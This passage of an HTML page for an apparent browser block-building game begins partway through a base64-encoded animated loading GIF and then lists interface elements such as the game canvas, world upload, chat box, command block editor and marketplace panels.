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"
		id="loadingImg"><br><br>
    <div id="loadBar" class="loadBar"><div></div></div>
    <div id="loadProgress">Initializing...</div>
  </div>
	<div id="bottomRightList"></div>
	<canvas id="overlay" tabindex="0" width="600" height="600" style="position: absolute; top: 0px; left: 0px; outline:none; width:100%; height:100%;"></canvas>
	<input type="text" id="savebox" class="hidden" spellcheck="false" style="position: absolute; top: 10px; left: 10px; z-index: 1;">
	<input type="text" id="boxcentertop" class="hidden" spellcheck="false">
	<input type="text" id="seedBox" spellcheck="false" placeholder="Enter seed">
  <input type="file" id="uploadWorld" class="hidden" accept=".minekhan" title="Upload a world">
	<div id="quota" class="hidden"></div>
  <!--<div id="editworld" class="hidden">
    <input type="text" id="url" spellcheck="false" placeholder="Enter thumbnail url">
  </div>-->
	<div id="editSignContainer" class="hidden">
  	<textarea id="editSignBox" class="type-emoji"></textarea>
		<div class="emoji-list" data-for="editSignBox"></div>
	</div>
  <div id="centerMessage" class="hidden"></div>
  <input type="text" id="anvilTextbox" class="hidden" style="position: absolute; top: 0px; left: 0px; z-index: 1;">
  <input type="text" id="invTextbox" class="hidden" style="position: absolute; top: 0px; left: 0px; z-index: 1; box-sizing:border-box;">
	<div id="onhover" class="hidden"></div>
	<p id="savedirections" class="hidden" style="position: absolute; top: 40px; left: 10px; z-index: 1; background-color: rgba(255, 255, 255, 0.3);">
		It is probably a bad<br>
		idea to use save codes.
	</p>
	<div class="world-select hidden" id="worlds"></div>
  <div class="world-select hidden" id="servers"></div>
  <div class="world-select hidden" id="marketplace"></div>
	<div class="world-select hidden" id="seeds"></div>
  <div id="marketplaceInfo" class="hidden"></div>
	<div id="messages" class='hidden'></div>
  <div id="messagesHolder" class="hidden">
		<div id="messagesScroll">
			<div id="messagesAll"></div>
			<div id="messageHints" class="hidden"></div>
			<div class="emoji-list" data-for="messageInput"></div>
		</div>
		<button id="messagesCmdHelp">/?</button>
    <input id="messageInput" autocomplete="off" spellcheck="false" class="type-emoji">
		<button id="messagesEnter">Enter</button>
		<div id="messageOverlay"></div>
  </div>
  <div id="customMenuContainer" class='hidden'>
    <button id="customMenuClose" style="float:right;">&times;</button>
    <div id="customMenu"></div>
  </div>
	<div id="updates" class="hidden"></div>
  <div style="position:absolute;top:0;left:0;width:100vw;"><video id="endPoemVideo" style="display:block;height:calc(var(--vh) - 40px);margin:auto;" class="hidden"></div>
  <div id="controls" class="hidden"></div>
  <div id="controlDetect" class="hidden" tabindex="0">Click or press a key</div>
  <select id="narratorVoiceSelect" class="hidden"></select>
	<div id="commandBlock" class='hidden'>
		<h2>Command Block Stuff</h2>
		<div style="position:relative;">
			<div id="commandBlockOverlay"></div>
			<textarea id="commandBlockInput" spellcheck="false"></textarea>
		</div>
		<br><br>
		<h3>Output</h3>
		<div id="commandBlockOutput"></div>
		<button>Done</button>
	</div>
	<div id="languages" class="hidden"></div>
	<div id="resourcePacks" class="hidden"></div>
	<div id="packetViewerContainer" class="hidden">
		<div id="packetViewerJSON"></div>
	</div>
	<div id="achievments" class="hidden"></div>
